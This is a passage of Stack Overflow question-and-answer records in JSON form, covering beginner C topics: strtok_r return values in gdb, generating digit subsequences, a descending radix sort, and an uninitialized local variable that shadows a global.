is:</p>\n\n<pre><code>0029ff10\n0029ff00\n</code></pre>\n\n<p>what is being referred to when i include the ampersand (<code>&amp;</code>) and does it have to do with the format specifier <code>%p</code>?</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 1, "creation_date": 1447266386, "post_id": 33657163, "comment_id": 55087897, "body": "Add <code>printf(&quot;subsystemstr=%s\\n&quot;,subsystemstr);</code> after <code>GetString</code> and before the <code>strtok</code> call and <code>printf(&quot;p_system=%s\\n&quot;, p_system);</code> after <code>strtok</code>.  What does it output?"}, {"owner": {"reputation": 251, "user_id": 1600402, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf04556d10627c6a918fec771d49ca25?s=128&d=identicon&r=PG", "display_name": "AshA", "link": "https://stackoverflow.com/users/1600402/asha"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1447266578, "post_id": 33657163, "comment_id": 55088023, "body": "It is giving the same output to me [&quot;all:&quot;, &#39;\\0&#39; &lt;repeats 59 times&gt;] and [0x388870 &quot;&quot;]"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 1, "creation_date": 1447268665, "post_id": 33657163, "comment_id": 55089324, "body": "@AshA: <code>printf(&quot;p_system=%s\\n&quot;, p_system)</code> will not print <code>[0x3888770 &quot;&quot;]</code> :) However, it would also be useful to have <code>printf(&quot;subsystemstr = %p;  p_system = %p\\n&quot;, subsystemstr, p_system);</code> in order to understand what p_system is pointing at. Finally, <code>strncmp</code> shouldn&#39;t be necessary here (unless you suspect you might buffer overrun subsystemstr, and you should avoid doing that instead :) ) and neither <code>strncmp</code> nor <code>strcmp</code> will return 0 when comparing &quot;all:&quot; with &quot;all&quot;. (unless you force the comparison to be 3 characters using <code>strncmp(..., 3);</code>)"}, {"owner": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 1, "creation_date": 1447270566, "post_id": 33657163, "comment_id": 55090407, "body": "Since you tagged this a C++, save yourself some frustration and use <code>std::string</code> and its many <code>find</code> methods."}, {"owner": {"reputation": 251, "user_id": 1600402, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf04556d10627c6a918fec771d49ca25?s=128&d=identicon&r=PG", "display_name": "AshA", "link": "https://stackoverflow.com/users/1600402/asha"}, "reply_to_user": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 0, "creation_date": 1447276937, "post_id": 33657163, "comment_id": 55093726, "body": "@ThomasMatthews: I am not frustated, I think you do not have good reading skills. As I mentioned I am doing testing so I can not modify the code.."}, {"owner": {"reputation": 251, "user_id": 1600402, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf04556d10627c6a918fec771d49ca25?s=128&d=identicon&r=PG", "display_name": "AshA", "link": "https://stackoverflow.com/users/1600402/asha"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1447276967, "post_id": 33657163, "comment_id": 55093746, "body": "@rici Thank You for your suggestion. I know printf(&quot;p_system=%s\\n&quot;, p_system) will not print [0x3888770 &quot;&quot;] :)  As I mentioned I am performing testing so I can not modify the code to put printf but as an alternative I am using the command &#39;p p_system&#39; in command line debugger and getting [0x3888770 &quot;&quot;]. One more thing I would like to share what I think here that strncmp will return 0 when comparing &quot;all&quot; with &quot;all&quot; as strtok_r will return token &quot;all&quot; after delimiting the string &quot;all:&quot; by delimiter &quot;:&quot;"}], "answers": [{"comments": [{"owner": {"reputation": 251, "user_id": 1600402, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf04556d10627c6a918fec771d49ca25?s=128&d=identicon&r=PG", "display_name": "AshA", "link": "https://stackoverflow.com/users/1600402/asha"}, "edited": false, "score": 0, "creation_date": 1447315919, "post_id": 33662149, "comment_id": 55106762, "body": "your suggestion really works for me to get the values of  p_system. Thanks."}], "tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 1, "last_activity_date": 1447286497, "creation_date": 1447286497, "answer_id": 33662149, "question_id": 33657163, "link": "https://stackoverflow.com/questions/33657163/how-strtok-r-function-return-values/33662149#33662149", "title": "How strtok_r function return values?", "body": "<p>I suspect your understanding of what </p>\n\n<pre><code>p p_system\n</code></pre>\n\n<p>actually does (prints the address of p_system)<br>\nin gdb, the command would be </p>\n\n<pre><code>p *p_system\n</code></pre>\n\n<p>or, using the builtin printf command</p>\n\n<pre><code>printf \"%s\", p_system\n</code></pre>\n\n<p>or, using the C function</p>\n\n<pre><code>call printf(\"%s\", p_system)\n</code></pre>\n\n<p>or,</p>\n\n<pre><code>call (void)puts(p_system)\n</code></pre>\n\n<p>or, if you do not mind also seeing some address values</p>\n\n<pre><code>x /s p_system\n</code></pre>\n"}], "owner": {"reputation": 251, "user_id": 1600402, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf04556d10627c6a918fec771d49ca25?s=128&d=identicon&r=PG", "display_name": "AshA", "link": "https://stackoverflow.com/users/1600402/asha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 204, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1447286497, "creation_date": 1447265833, "last_edit_date": 1447267404, "question_id": 33657163, "link": "https://stackoverflow.com/questions/33657163/how-strtok-r-function-return-values", "title": "How strtok_r function return values?", "body": "<p>I am doing component test for a 'C' code. I have read the functionality of <strong>strtok_r</strong> function but I am not able to get the return value that I want to pass in <strong>strncmp</strong>' function. My code is contains <strong>strtok_r</strong> and <strong>strncmp</strong> functions as below:</p>\n\n<pre><code>typedef struct BufferN {\n    uint32_t v;\n    uint32_t m;\n} My_Buffer;\n\nchar subsystemstr[64] = { '\\0' };\nMy_Buffer buffer;\nchar *p_system;\nchar *p_subsystem;\n\n(void) GetString(&amp;buffer, subsystemstr, sizeof(subsystemstr));\np_system = strtok_r (subsystemstr, \":\", &amp;p_subsystem);\n\nfor (i = 0u; i &lt; 100; i++) \n{\n    if (strncmp(p_system, \"all\", 64) == 0) \n    {\n       /*Some Code Statement*/\n    }\n}\n</code></pre>\n\n<p>Since array <strong>subsystemstr</strong> is initialized to '\\0', I am modifying this array value with the help of function <strong>GetString</strong> as below:</p>\n\n<pre><code>strncpy(subsystemstr, \"all:\", 64);\n</code></pre>\n\n<p>When I am printing <strong>subsystemstr</strong>, I am having updated array as:</p>\n\n<pre><code>[\"all:\", '\\0' &lt;repeats 59 times&gt;]\n</code></pre>\n\n<p>but when I am printing <strong>p_system</strong>(return value of strtok_r). I am getting    </p>\n\n<pre><code>[0x388870 \"\"] \n</code></pre>\n\n<p>I am confused how it is working. Actually I want value of p_system = <strong>\"all\"</strong> so that 'strncmp' function can <strong>return 0.</strong>\nPlease suggest.</p>\n"}, {"tags": ["c", "subsequence"], "comments": [{"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 3, "creation_date": 1447265639, "post_id": 33657074, "comment_id": 55087422, "body": "<i>and without using functions</i> -- What&#39;s so bad about functions? Used properly, they can make the code easier to understand."}, {"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 1, "creation_date": 1447265651, "post_id": 33657074, "comment_id": 55087435, "body": "<code>max=max-2</code> adding a semicolon removes a compiler error if that&#39;s what you consider &quot;efficient.&quot;"}, {"owner": {"reputation": 25, "user_id": 5546717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6094effb9a924c70734d3e5382127f2d?s=128&d=identicon&r=PG&f=1", "display_name": "riegour", "link": "https://stackoverflow.com/users/5546717/riegour"}, "edited": false, "score": 0, "creation_date": 1447265723, "post_id": 33657074, "comment_id": 55087479, "body": "wow yeah, sorry about that i made a change and forgot."}, {"owner": {"reputation": 26959, "user_id": 1294207, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/Inny3.jpg?s=128&g=1", "display_name": "Fantastic Mr Fox", "link": "https://stackoverflow.com/users/1294207/fantastic-mr-fox"}, "reply_to_user": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1447265759, "post_id": 33657074, "comment_id": 55087501, "body": "@cad no way! Without that semicolon the code runs in 0 seconds!"}, {"owner": {"reputation": 25, "user_id": 5546717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6094effb9a924c70734d3e5382127f2d?s=128&d=identicon&r=PG&f=1", "display_name": "riegour", "link": "https://stackoverflow.com/users/5546717/riegour"}, "edited": false, "score": 0, "creation_date": 1447265764, "post_id": 33657074, "comment_id": 55087503, "body": "Im only saying not to use functions because i havent really looked into them yet and dont understand them, thanks though!"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1447265778, "post_id": 33657074, "comment_id": 55087509, "body": "The task might be easier if you treated the number as string, i.e. as char array with the digits as characters instead of recnstructing the number every time."}, {"owner": {"reputation": 25, "user_id": 5546717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6094effb9a924c70734d3e5382127f2d?s=128&d=identicon&r=PG&f=1", "display_name": "riegour", "link": "https://stackoverflow.com/users/5546717/riegour"}, "edited": false, "score": 0, "creation_date": 1447265890, "post_id": 33657074, "comment_id": 55087577, "body": "thats true, but the exercise im working on wants it to be #define&#39;d as a number"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1447266809, "post_id": 33657074, "comment_id": 55088200, "body": "Use <code>unsigned</code> rather than <code>int</code>.  Allows simplifications like <code>int%2</code> has 3 possible results and <code>unsigned%2</code> has only two.  YMMV - highly dependent on processor."}, {"owner": {"reputation": 25, "user_id": 5546717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6094effb9a924c70734d3e5382127f2d?s=128&d=identicon&r=PG&f=1", "display_name": "riegour", "link": "https://stackoverflow.com/users/5546717/riegour"}, "edited": false, "score": 0, "creation_date": 1447267040, "post_id": 33657074, "comment_id": 55088335, "body": "thats a good idea, thanks! Edit: Helped quite a bit!"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1447267380, "post_id": 33657074, "comment_id": 55088561, "body": "Is your question that you need an explanation of your code? (I ask, because you said that you didn&#39;t understand the answers to the question you linked to.)"}, {"owner": {"reputation": 25, "user_id": 5546717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6094effb9a924c70734d3e5382127f2d?s=128&d=identicon&r=PG&f=1", "display_name": "riegour", "link": "https://stackoverflow.com/users/5546717/riegour"}, "edited": false, "score": 0, "creation_date": 1447267783, "post_id": 33657074, "comment_id": 55088799, "body": "Well i understood the top answer but i didnt understand the code on any of the others."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1447273133, "post_id": 33657074, "comment_id": 55091754, "body": "You <b><i>are</i></b> using a function: <code>printf()</code> which is a library function and you <code>#include &lt;stdio.h&gt;</code> to make it work!"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447286713, "post_id": 33657074, "comment_id": 55097898, "body": "for readability and ease of documentation, only one variable declaration per statement, only one statement per line."}], "answers": [{"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1447287546, "creation_date": 1447287546, "answer_id": 33662322, "question_id": 33657074, "link": "https://stackoverflow.com/questions/33657074/subsequence-calculator-can-i-make-it-more-efficient/33662322#33662322", "title": "Subsequence calculator. Can i make it more efficient?", "body": "<p>The root of the reason that certain subsequences appear more than once with some numbers is because those numbers have repetitions of the same digit.</p>\n\n<p>That repetition could be eliminated by saving each subsequence in an array and checking that array to see if the specific subsequence is already in the array.  If already in the array, do not print.  Otherwise, add subsequence to array contents and print</p>\n"}, {"tags": [], "owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "is_accepted": false, "score": 0, "last_activity_date": 1447312727, "creation_date": 1447312727, "answer_id": 33666117, "question_id": 33657074, "link": "https://stackoverflow.com/questions/33657074/subsequence-calculator-can-i-make-it-more-efficient/33666117#33666117", "title": "Subsequence calculator. Can i make it more efficient?", "body": "<p>The problem can be divided into two tasks: (1) find all subsequences of an array of digits and (2) pack and unpack integers into digits.</p>\n\n<p>Let's consider the subsequences of the array <code>{a, b, c}</code>. You can generate them by walking through the array from left to right and follow two paths: One where you include the current element in a subsequence and one where you don't.</p>\n\n<p>That leads to a recursive approach tat we can represent as a tree:</p>\n\n<pre><code>                  {}\n               /      \\\n         {}               {a}\n       /    \\           /     \\\n    {}        {b}     {a}      {ab}\n   /  \\      /   \\   /   \\    /    \\\n  {}  {c}  {b} {bc} {a} {ac} {ab} {abc}\n</code></pre>\n\n<p>When we branch left, we skip the current element and when we go right, we include the element. The elements themselves are the depth of the tree: On the first level we treat element <code>a</code>, on the next <code>b</code>and on the last <code>c</code>.</p>\n\n<p>The bottom row has all subsequences. This includes the empty sequence and the full sequence, which you don't want. But let's include them for now. (The arrays in the bottom row are usually called a <a href=\"https://en.wikipedia.org/wiki/Power_set\" rel=\"nofollow\">power set</a>, which is a nice web-searchable term.)</p>\n\n<p>I mentioned recursion, which entails recursive functions, and functions are out.</p>\n\n<p>So we need to tackle the problem another way. Let's turn the tree on its side. A dash denotes that the element was skipped. The notation on the right uses another notation: <code>0</code> means the element was skipped, <code>1</code> means the element was included:</p>\n\n<pre><code>- - -        000\n- - c        001\n- b -        010\n- b c        011\na - -        100\na - c        101\na b -        110\na b c        111\n</code></pre>\n\n<p>I hope the codes on the right look familiar, because that's how you count from <code>000</code> to <code>111</code> in binary. That's a nice way to enumerate our elements. Now we need a way to tell which bits are set in each number.</p>\n\n<p>The rightmost bit is set when the number is odd. We can find out about the other bits by repeatedly dividing the number by two, which in binary is a shift to the right, discarding the rightmost bit.</p>\n\n<p>Now how to extract the digits from the original number? That number is a decimal number; it's in base 10. We can use the same approach as for finding the bits in the binary number, because the bits 0 and 1 are the binary digits.</p>\n\n<p>Start with the number. The last digit is the result of taking the remainder after a division by 10. Then divide the number by ten until it is zero. This code yields the digits from right to left. So does the code for finding the bits, which means we can find whether a bit is set and which digit to print in a single loop, always taking the rightmost bit and if it is set, print the rightmost digit of the original number.</p>\n\n<p>The empty and the full subsequences are the first and last items in the enumeration. If you don't want them, skip them.</p>\n\n<p>That leaves the problem of the duplicated subsequences if the digit has repeated digits. I don' see an easy way to solve this except user3629249's suggestion to create the subsequence anyway and later check whether is has already been printed.</p>\n\n<p>An easy way to do this is to keep an array of the subsequences. That array has <code>max</code> entries. After you have filled that array, sort it and then print it, but skip entries that are equal to the previous entry.</p>\n\n<p>Here's an example implementation that uses an array of digits so that the original number doesn't have to be decomposed each time. It uses the sorting function <code>qsort</code> from <code>&lt;stdlib.h&gt;</code>, which requires a sorting function:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\n#define NUM 412131\n\ntypedef unsigned int uint;\n\nint uintcmp(const void *pa, const void *pb)\n{\n    const uint *a = pa;\n    const uint *b = pb;\n\n    return (*a &gt; *b) - (*a &lt; *b);\n}\n\nint main(void)\n{\n    uint digit[20];             // array of digits\n    size_t ndigit = 0;          // length of array\n    uint num = NUM;\n    uint max = 1;\n    size_t i;\n\n    while (num) {\n        digit[ndigit++] = num % 10;\n        num /= 10;\n        max *= 2;\n    }\n\n    uint res[max];              // array of subsequences\n\n    for (i = 0; i &lt; max; i++) {\n        uint mask = i;          // mask for bit detection\n        uint j = ndigit;        // index into digit array\n        uint s = 0;\n\n        while (j--) {\n            if (mask % 2) s = s*10 + digit[j];\n            mask /= 2;\n        }\n\n        res[i] = s;\n    }\n\n    qsort(res, max, sizeof(*res), uintcmp);\n\n    for (i = 1; i &lt; max - 1; i++) {\n        if (res[i] != res[i - 1]) printf(\"%u\\n\", res[i]);\n    }\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 25, "user_id": 5546717, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6094effb9a924c70734d3e5382127f2d?s=128&d=identicon&r=PG&f=1", "display_name": "riegour", "link": "https://stackoverflow.com/users/5546717/riegour"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 181, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1447312727, "creation_date": 1447265510, "last_edit_date": 1495535235, "question_id": 33657074, "link": "https://stackoverflow.com/questions/33657074/subsequence-calculator-can-i-make-it-more-efficient", "title": "Subsequence calculator. Can i make it more efficient?", "body": "<p>The idea of subsequences is explained very well in this post:<a href=\"https://stackoverflow.com/questions/11774059/generate-subsequences\">Generate subsequences</a></p>\n\n<p>But i didnt understand the answers on that question because im a beginner.</p>\n\n<p>What i wanted to know is if i could make my C program any more efficient while still keeping it simple and understandable and without using functions?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define NUM 123456\n\nint main(void) {\n\n    int i,num=NUM,x,y,mask,digits=0,max=1;\n\n    while ( num != 0 ) {  //calculate digits\n        num /= 10;\n        digits++;\n    }\n\n    for ( i = 1; i &lt;= digits; i++ ) {  //calculate max number of subsequences\n        max *= 2;     \n    }\n    max=max-2;\n\n    printf(\"Subsequences are:\\n\");\n    for ( i = 1; i &lt;= max ; i++ ) {\n        mask = i;     //digit selector\n        x = 1;        //multiplier\n        num = NUM;\n        y=0;          //subsequence value\n\n        while ( num != 0 ) {\n            if ( mask % 2 == 1 ) {\n                y += num % 10 * x;\n                x *= 10; \n            }\n            num /= 10;\n            mask /= 2;\n        }\n        printf(\"%d \\n\" , y);\n    } \n\n    return 0;\n}\n</code></pre>\n\n<p>Note that when we define NUM as a number such as 5111 or 100 some of the subsequences appear twice. Is there any simple way to fix that?\nThanks!</p>\n"}, {"tags": ["c", "sorting", "radix"], "comments": [{"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1447265648, "post_id": 33657031, "comment_id": 55087432, "body": "Why not just use your original code, then when it is done, reverse the list?"}, {"owner": {"reputation": 3614, "user_id": 801919, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/4iZO0.jpg?s=128&g=1", "display_name": "Vikram", "link": "https://stackoverflow.com/users/801919/vikram"}, "edited": false, "score": 0, "creation_date": 1447267015, "post_id": 33657031, "comment_id": 55088318, "body": "Is the last value (after sorting in descending order) always equal to the first value from the input array (before sorting)?"}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 4173477, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-OycvoSsNwn4/AAAAAAAAAAI/AAAAAAAAADU/N21Tow7aZNc/photo.jpg?sz=128", "display_name": "Kyoz", "link": "https://stackoverflow.com/users/4173477/kyoz"}, "edited": false, "score": 0, "creation_date": 1447300761, "post_id": 33657919, "comment_id": 55101800, "body": "Thank you very much...Now i got it :D"}], "tags": [], "owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "is_accepted": true, "score": 1, "last_activity_date": 1447274042, "last_edit_date": 1447274042, "creation_date": 1447268512, "answer_id": 33657919, "question_id": 33657031, "link": "https://stackoverflow.com/questions/33657031/radix-sort-descending/33657919#33657919", "title": "Radix Sort: Descending", "body": "<p>The issue is trying to reverse the array on each pass, since radix sort preserves the order on equal values. After the third pass, 0705 ends up before 0099 (7 > 0). On the last pass, the most significant digits are 0, so the order kept, so b[0] = 0705, b[1] = 0099, then gets reversed to a[] = {..., 0099, 0705}.</p>\n\n<p>Instead of reversing after each pass, reverse the indexes used for bucket by using 9 - digit. The changes are commented:</p>\n\n<pre><code>void RadixSort (int a[], int n){\nint i, m=0, exp=1, b[MAX];\n    for (i=0; i&lt;n; i++)\n        if (a[i]&gt;m)\n            m=a[i];\n    while (m/exp&gt;0)\n    {\n        int bucket[10]={0};\n        for (i=0; i&lt;n; i++)\n            bucket[9-a[i]/exp%10]++;         // changed this line\n        for (i=1; i&lt;10; i++)\n            bucket[i]+=bucket[i-1];\n        for (i=n-1; i&gt;=0; i--)\n            b[--bucket[9-a[i]/exp%10]]=a[i]; // changed this line\n        for (i=0; i&lt;n;i++){\n            a[i]=b[i];                       // changed this line\n        }\n        exp*=10;\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 4173477, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-OycvoSsNwn4/AAAAAAAAAAI/AAAAAAAAADU/N21Tow7aZNc/photo.jpg?sz=128", "display_name": "Kyoz", "link": "https://stackoverflow.com/users/4173477/kyoz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5088, "favorite_count": 2, "accepted_answer_id": 33657919, "answer_count": 1, "score": 2, "last_activity_date": 1447274042, "creation_date": 1447265392, "last_edit_date": 1447268849, "question_id": 33657031, "link": "https://stackoverflow.com/questions/33657031/radix-sort-descending", "title": "Radix Sort: Descending", "body": "<p>Here is my RadixSort function (ascending):</p>\n\n<pre><code>void RadixSort (int a[], int n)\n{\n    int i, m=0, exp=1, b[MAX];\n    for (i=0; i&lt;n; i++)\n    {\n        if (a[i]&gt;m)\n            m=a[i];\n    }\n    while (m/exp&gt;0)\n    {\n        int bucket[10]={0};\n        for (i=0; i&lt;n; i++)\n            bucket[a[i]/exp%10]++;\n        for (i=1; i&lt;10; i++)\n            bucket[i]+=bucket[i-1];\n        for (i=n-1; i&gt;=0; i--)\n            b[--bucket[a[i]/exp%10]]=a[i];\n        for (i=0; i&lt;n;i++){\n            a[i]=b[i];\n        }\n        exp*=10;\n    }\n}\n</code></pre>\n\n<p>I'm try to change this to a descending sort by replacing</p>\n\n<pre><code>for (i=0; i&lt;n;i++) {\n    a[i]=b[i];\n}\n</code></pre>\n\n<p>with</p>\n\n<pre><code>for (i=0; i&lt;n;i++) {\n    a[i]=b[n-i-1];\n}\n</code></pre>\n\n<p>But it didn't work.\nI tried with: [705, 1725, 99, 9170, 7013] </p>\n\n<p>But the result is: [9170, 7013, 1725, 99, 705]</p>\n\n<p>The last value is always wrong. Is there anything I missed?</p>\n"}, {"tags": ["c", "global-variables"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 2, "creation_date": 1447265159, "post_id": 33656854, "comment_id": 55087133, "body": "You&#39;re reading a local variable (<code>counter</code> as declared in <code>CreateTemp</code>) before assigning any value to it. This leads to undefined behaviour. Anything (including the program crashing any time you call <code>CreateTemp</code>) could have happened."}], "answers": [{"tags": [], "owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "is_accepted": false, "score": 6, "last_activity_date": 1447438394, "last_edit_date": 1447438394, "creation_date": 1447264932, "answer_id": 33656903, "question_id": 33656854, "link": "https://stackoverflow.com/questions/33656854/explain-the-following-output-for-c-program/33656903#33656903", "title": "Explain the following output for C program", "body": "<p>Local variables aren't initialized by default and using them without assigning them an explicit value yields <strong>undefined behavior</strong>, which means <strong>anything may happen</strong>.</p>\n\n<p>The C standard literally doesn't define what happens, so it's a (un)lucky coincidence your first two strings are correct while the last one isn't. From the C standard's point of view, undefined behavior can even cause your machine to explode.</p>\n\n<p>Global variables are initialized to zero by default.</p>\n"}, {"tags": [], "owner": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "is_accepted": true, "score": 5, "last_activity_date": 1447265001, "creation_date": 1447265001, "answer_id": 33656918, "question_id": 33656854, "link": "https://stackoverflow.com/questions/33656854/explain-the-following-output-for-c-program/33656918#33656918", "title": "Explain the following output for C program", "body": "<pre><code> int counter; // for counting temporaries\n char s[10];\n sprintf(s,\"T%d\",counter++);\n</code></pre>\n\n<ul>\n<li>You have to initialize variables in C. Othewise their value\nis undefined; often something random.</li>\n<li><p>If you want the local variable to keep the same between calls to the function, you can make it <code>static</code>:</p>\n\n<pre><code>static int counter = 0;\n</code></pre></li>\n</ul>\n\n<p>It's also a bad idea to have both a local and global variable with the same name. When you delete your line you end up using the global variable. That's why it works then.</p>\n"}, {"tags": [], "owner": {"reputation": 2384, "user_id": 4624683, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/39130cd702675dc4f741e62e64479eb6?s=128&d=identicon&r=PG&f=1", "display_name": "DBug", "link": "https://stackoverflow.com/users/4624683/dbug"}, "is_accepted": false, "score": 5, "last_activity_date": 1447265025, "creation_date": 1447265025, "answer_id": 33656925, "question_id": 33656854, "link": "https://stackoverflow.com/questions/33656854/explain-the-following-output-for-c-program/33656925#33656925", "title": "Explain the following output for C program", "body": "<p>The int counter inside CreateTemp is \"hiding\" the global counter definition, so that is always 0, and since the counter inside CreateTemp is not initialized, you're getting whatever data happens to be there.</p>\n"}], "owner": {"reputation": 41, "user_id": 5048247, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5e6655318698f12b76c798125ac567a2?s=128&d=identicon&r=PG&f=1", "display_name": "Coheen", "link": "https://stackoverflow.com/users/5048247/coheen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "accepted_answer_id": 33656918, "answer_count": 3, "score": -1, "last_activity_date": 1447438394, "creation_date": 1447264777, "last_edit_date": 1447268326, "question_id": 33656854, "link": "https://stackoverflow.com/questions/33656854/explain-the-following-output-for-c-program", "title": "Explain the following output for C program", "body": "<p>I wrote this C program with the following output</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nint counter; // global for counting input tokens\nchar * CreateTemp()\n{ \n int counter; // for counting temporaries\n char s[10];\n 